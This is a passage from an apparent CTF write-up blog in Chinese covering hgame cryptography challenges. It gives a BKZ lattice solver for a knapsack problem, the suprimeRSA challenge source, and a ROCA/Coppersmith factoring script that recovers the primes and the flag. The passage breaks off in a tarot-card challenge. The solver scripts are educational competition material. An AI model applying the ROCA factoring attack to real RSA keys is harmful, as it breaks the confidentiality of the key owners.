style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">3</span><span class="mclose">]</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">6</span><span class="mord">2</span><span class="mclose">]</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">3</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.550045em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-1.8999850000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-2.4949950000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.090005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-3.6850150000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.280025em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-4.3100249999999996em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎟</span></span></span><span style="top:-5.550045em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>这样使用LLL格不出来，BKZ就可以(我也不懂)</p><p>然后格出来的第一个向量就我们需要的，我们知道最高位一定为1，所以跟第一位一样的就是1就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-built_in">list</span>=<br>bag=<br>ciphertext=<br>L=Matrix(ZZ,<span class="hljs-number">65</span>,<span class="hljs-number">68</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    L[i,i]=<span class="hljs-number">2</span><br>    L[i,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">2</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">3</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">4</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">3</span>][-i-<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=bag[<span class="hljs-number">0</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">2</span>]=bag[<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">3</span>]=bag[<span class="hljs-number">2</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">4</span>]=bag[<span class="hljs-number">3</span>]<br>x=L.BKZ()<br><span class="hljs-built_in">print</span>(x[<span class="hljs-number">0</span>])<br>p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:<span class="hljs-number">64</span>]:<br>    <span class="hljs-keyword">if</span> i==x[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]:<br>        p+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        p+=<span class="hljs-string">&#x27;0&#x27;</span><br>p=<span class="hljs-built_in">int</span>(p,<span class="hljs-number">2</span>)<br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#b&#x27;hgame&#123;A_S1mple_Modul@r_Subset_Sum_Problem&#125;\x06\x06\x06\x06\x06\x06&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="suprimersa"><a class="markdownIt-Anchor" href="#suprimersa"></a> suprimeRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> prime<br><br>FLAG=<span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>e=<span class="hljs-number">0x10001</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">primorial</span>(<span class="hljs-params">num</span>):<br>    result = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, num + <span class="hljs-number">1</span>):<br>        result *= prime(i)<br>    <span class="hljs-keyword">return</span> result<br>M=primorial(random.choice([<span class="hljs-number">39</span>,<span class="hljs-number">71</span>,<span class="hljs-number">126</span>]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">40</span>))<br>        a = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">60</span>))<br>        p = k * M + <span class="hljs-built_in">pow</span>(e, a, M)<br>        <span class="hljs-keyword">if</span> isPrime(p):<br>            <span class="hljs-keyword">return</span> p<br><br>p,q=gen_key(),gen_key()<br>n=p*q<br>m=bytes_to_long(FLAG)<br>enc=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;n=&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>改之后就是roca，套脚本就好了</p><p>通过enc的值可以判断密钥空间大小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">## Coppersmith-howgrave</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">coppersmith_howgrave</span>(<span class="hljs-params">f, N, beta, m, t, R</span>):<br>    <span class="hljs-comment">#Check if parameters are within bounds</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt; beta &lt;= <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;beta not in (0, 1]&#x27;</span><br>    <span class="hljs-keyword">assert</span> f.is_monic(), <span class="hljs-string">&#x27;f is not monic&#x27;</span><br>    <br>    <span class="hljs-comment">#get delta and the matrix dimension</span><br>    delta = f.degree()<br>    n = delta * m + t<br>    <br>    <span class="hljs-comment">#Building the polynomials</span><br>    fZ = f.change_ring(ZZ) <span class="hljs-comment">#change the ring from Zmod(N) to ZZ</span><br>    x = fZ.parent().gen()  <span class="hljs-comment">#make x a variable in ZZ</span><br>    f_list = [] <br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(delta):<br>            <span class="hljs-comment">#We want them ordered that&#x27;s we have N^(m-ii1) and fZ^ii</span><br>            f_list.append(((x*R)^j) * N^(m-ii) * fZ(x*R)^(ii)) <span class="hljs-comment">#the g_&#123;i,j&#125;</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>        f_list.append((x*R)^ii * fZ(x*R)^m) <span class="hljs-comment">#the h_i</span><br>        <br>    <span class="hljs-comment">#Build the lattice</span><br>    B = matrix(ZZ, n) <span class="hljs-comment"># n = delta * m + t</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii+<span class="hljs-number">1</span>):<br>            B[ii, j] = f_list[ii][j]<br>            <br>    <span class="hljs-comment">#LLL it</span><br>    B_lll = B.LLL(early_red = <span class="hljs-literal">True</span>, use_siegel = <span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">#take the shortest vector to construct our new poly g</span><br>    g = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        g += x^ii * B_lll[<span class="hljs-number">0</span>, ii] / R^ii<br>    <br>    <span class="hljs-comment">#factor the polynomial</span><br>    potential_roots = g.roots()<br>    <span class="hljs-comment">#print(&#x27;potential roots:&#x27;, potential_roots)</span><br>    <br>    <span class="hljs-comment">#we don&#x27;t need to do this Since our we test in our roca function</span><br><span class="hljs-comment">#     #test roots</span><br><span class="hljs-comment">#     roots = []</span><br><span class="hljs-comment">#     for r in potential_roots:</span><br><span class="hljs-comment">#         if r[0].is_integer():</span><br><span class="hljs-comment">#             res = fZ(ZZ(r[0]))</span><br><span class="hljs-comment">#             if gcd(N, res) &gt;= N^beta:</span><br><span class="hljs-comment">#                 roots.append(ZZ(r[0]))</span><br>    <span class="hljs-comment">#print(&#x27;roots:&#x27;, roots)</span><br>    <span class="hljs-keyword">return</span> potential_roots<br>    <span class="hljs-comment">#return roots</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">roca</span>(<span class="hljs-params">N, M_prime, g, m, t, beta</span>):<br>    g = <span class="hljs-built_in">int</span>(g)<br>    c_prime = discrete_log(Zmod(M_prime)(N), Zmod(M_prime)(g))<br>    ord_M_prime = Zmod(M_prime)(g).multiplicative_order()<br>    <br>    <span class="hljs-comment">#search boundaries</span><br>    bottom = c_prime // <span class="hljs-number">2</span> <br>    top =(c_prime + ord_M_prime) // <span class="hljs-number">2</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;numbers to check&#x27;</span>,   top - bottom, <span class="hljs-string">&#x27; between &#x27;</span>, (bottom, top))<br><br>    <br>    <span class="hljs-comment">#constants for coppersmith</span><br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    epsilon = beta / <span class="hljs-number">7</span><br>    X = floor(<span class="hljs-number">2</span> * N^beta / M_prime)<br>    <br>    <span class="hljs-comment">#the search</span><br>    <span class="hljs-keyword">for</span> i, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">range</span>(bottom, top)):<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>: <span class="hljs-comment">#count iterations</span><br>            <span class="hljs-built_in">print</span>(i)<br>            <br>        <span class="hljs-comment">#construct polynomial</span><br>        f = x + <span class="hljs-built_in">int</span>((inverse_mod(M_prime, N)) * <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime)))<br><br>        <span class="hljs-comment">#roots = f.small_roots(X, beta, epsilon) #coppersmith</span><br>        roots = coppersmith_howgrave(f, N, beta, m, t, X)<br>        <span class="hljs-comment">#check solutions</span><br>        <span class="hljs-keyword">for</span> k_prime, _ <span class="hljs-keyword">in</span> roots:<br>            p = <span class="hljs-built_in">int</span>(k_prime * M_prime) + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime))<br>            <span class="hljs-keyword">if</span> N % p == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> p, N//p<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>n=<span class="hljs-number">787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span><br>e=<span class="hljs-number">65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_M1_m_t_values</span>(<span class="hljs-params">key_size</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">512</span> &lt;= key_size &lt; <span class="hljs-number">1024</span>:<br>        m = <span class="hljs-number">5</span><br>        M1=<span class="hljs-number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">1024</span> &lt;= key_size &lt; <span class="hljs-number">2048</span>:<br>        m = <span class="hljs-number">4</span><br>        M1=<span class="hljs-number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">2048</span> &lt;= key_size &lt; <span class="hljs-number">3072</span>:<br>        m = <span class="hljs-number">6</span><br>        M1=<span class="hljs-number">0x016928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">3072</span> &lt;= key_size &lt; <span class="hljs-number">4096</span>:<br>        m = <span class="hljs-number">25</span><br>    <span class="hljs-keyword">else</span>:<br>        m = <span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> M1,m, m+<span class="hljs-number">1</span><br>M_prime,m, t = get_M1_m_t_values(<span class="hljs-number">512</span>)<br>p, q = roca(n, M_prime, e, m, t, <span class="hljs-number">.5</span>) <br><span class="hljs-keyword">assert</span>(p*q==n)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br>enc=<span class="hljs-number">365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(enc,inverse_mod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),n))))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">24000</span><br><span class="hljs-string">954455861490902893457047257515590051179337979243488068132318878264162627</span><br><span class="hljs-string">824752716083066619280674937934149242011126804999047155998788143116757683</span><br><span class="hljs-string">b&#x27;hgame&#123;ROCA_ROCK_and_ROll!&#125;&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="ancient-recall"><a class="markdownIt-Anchor" href="#ancient-recall"></a> Ancient Recall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>Major_Arcana = [<span class="hljs-string">&quot;The Fool&quot;</span>, <span class="hljs-string">&quot;The Magician&quot;</span>, <span class="hljs-string">&quot;The High Priestess&quot;</span>,<span class="hljs-string">&quot;The Empress&quot;</span>, <span class="hljs-string">&quot;The Emperor&quot;</span>, <span class="hljs-string">&quot;The Hierophant&quot;</span>,<span class="hljs-string">&quot;The Lovers&quot;</span>, <span class="hljs-string">&quot;The Chariot&quot;</span>, <span class="hljs-string">&quot;Strength&quot;</span>,<span class="hljs-string">&quot;The Hermit&quot;</span>, <span class="hljs-string">&quot;Wheel of Fortune&quot;</span>, <span class="hljs-string">&quot;Justice&quot;</span>,<span class="hljs-string">&quot;The Hanged Man&quot;</span>, <span class="hljs-string">&quot;Death&quot;</span>, <span class="hljs-string">&quot;Temperance&quot;</span>,<span class="hljs-string">&quot;The Devil&quot;</span>, <span class="hljs-string">&quot;The Tower&quot;</span>, <span class="hljs-string">&quot;The Star&quot;</span>,<span class="hljs-string">&quot;The Moon&quot;</span>, <span class="hljs-string">&quot;The Sun&quot;</span>, <span class="hljs-string">&quot;Judgement&quot;</span>,<span class="hljs-string">&quot;The World&quot;</span>]<br>wands = [<span class="hljs-string">&quot;Ace of Wands&quot;</span>, <span class="hljs-string">&quot;Two of Wands&quot;</span>, <span class="hljs-string">&quot;Three of Wands&quot;</span>, <span class="hljs-string">&quot;Four of Wands&quot;</span>, <span class="hljs-string">&quot;Five of Wands&quot;</span>, <span class="hljs-string">&quot;Six of Wands&quot;</span>, <span class="hljs-string">&quot;Seven of Wands&quot;</span>, <span class="hljs-string">&quot;Eight of Wands&quot;</span>, <span class="hljs-string">&quot;Nine of Wands&quot;</span>, <span class="hljs-string">&quot;Ten of Wands&quot;</span>, <span class="hljs-string">&quot;Page of Wands&quot;</span>, <span class="hljs-string">&quot;Knight of Wands&quot;</span>, <span class="hljs-string">&quot;Queen of Wands&quot;</span>, <span class="hljs-string">&quot;King of Wands&quot;</span>]<br>cups = [<span class="hljs-string">&quot;Ace of Cups&quot;</span>, <span class="hljs-string">&quot;Two of Cups&quot;</span>, <span class="hljs-string">&quot;Three of Cups&quot;</span>, <span class="hljs-string">&quot;Four of Cups&quot;</span>, <span class="hljs-string">&quot;Five of Cups&quot;</span>, <span class="hljs-string">&quot;Six of Cups&quot;</span>, <span class="hljs-string">&quot;Seven of Cups&quot;</span>, <span class="hljs-string">&quot;Eight of Cups&quot;</span>, <span class="hljs-string">&quot;Nine of Cups&quot;</span>, <span class="hljs-string">&quot;Ten of Cups&quot;</span>, <span class="hljs-string">&quot;Page of Cups&quot;</span>, <span class="hljs-string">&quot;Knight of Cups&quot;</span>, <span class="hljs-string">&quot;Queen of Cups&quot;</span>, <span class="hljs-string">&quot;King of Cups&quot;</span>]<br>swords = [<span class="hljs-string">&quot;Ace of Swords&quot;</span>, <span class="hljs-string">&quot;Two of Swords&quot;</span>, <span class="hljs-string">&quot;Three of Swords&quot;</span>, <span class="hljs-string">&quot;Four of Swords&quot;</span>, <span class="hljs-string">&quot;Five of Swords&quot;</span>, <span class="hljs-string">&quot;Six of Swords&quot;</span>, <span class="hljs-string">&quot;Seven of Swords&quot;</span>, <span class="hljs-string">&quot;Eight of Swords&quot;</span>, <span class="hljs-string">&quot;Nine of Swords&quot;</span>, <span class="hljs-string">&quot;Ten of Swords&quot;</span>, <span class="hljs-string">&quot;Page of Swords&quot;</span>, <span class="hljs-string">&quot;Knight of Swords&quot;</span>, <span class="hljs-string">&quot;Queen of Swords&quot;</span>, <span class="hljs-string">&quot;King of Swords&quot;</span>]<br>pentacles = [<span class="hljs-string">&quot;Ace of Pentacles&quot;</span>, <span class="hljs-string">&quot;Two of Pentacles&quot;</span>, <span class="hljs-string">&quot;Three of Pentacles&quot;</span>, <span class="hljs-string">&quot;Four of Pentacles&quot;</span>, <span class="hljs-string">&quot;Five of Pentacles&quot;</span>, <span class="hljs-string">&quot;Six of Pentacles&quot;</span>, <span class="hljs-string">&quot;Seven of Pentacles&quot;</span>, <span class="hljs-string">&quot;Eight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Nine of Pentacles&quot;</span>, <span class="hljs-string">&quot;Ten of Pentacles&quot;</span>, <span class="hljs-string">&quot;Page of Pentacles&quot;</span>, <span class="hljs-string">&quot;Knight of Pentacles&quot;</span>, <span class="hljs-string">&quot;Queen of Pentacles&quot;</span>, <span class="hljs-string">&quot;King of Pentacles&quot;</span>]<br>Minor_Arcana = wands + cups + swords + pentacles<br>tarot = Major_Arcana + Minor_Arcana<br>reversals = [<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>]<br><br>Value = []<br>cards = []<br>YOUR_initial_FATE = []<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(YOUR_initial_FATE)&lt;<span class="hljs-number">5</span>:<br>    card = random.choice(tarot)<br>    <span class="hljs-keyword">if</span> card <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cards:<br>        cards.append(card)<br>        <span class="hljs-keyword">if</span> card <span class="hljs-keyword">in</span> Major_Arcana:<br>            k = random.choice(reversals)<br>            Value.append(tarot.index(card)^k)<br>            <span class="hljs-keyword">if</span> k == -<span class="hljs-number">1</span>:<br>                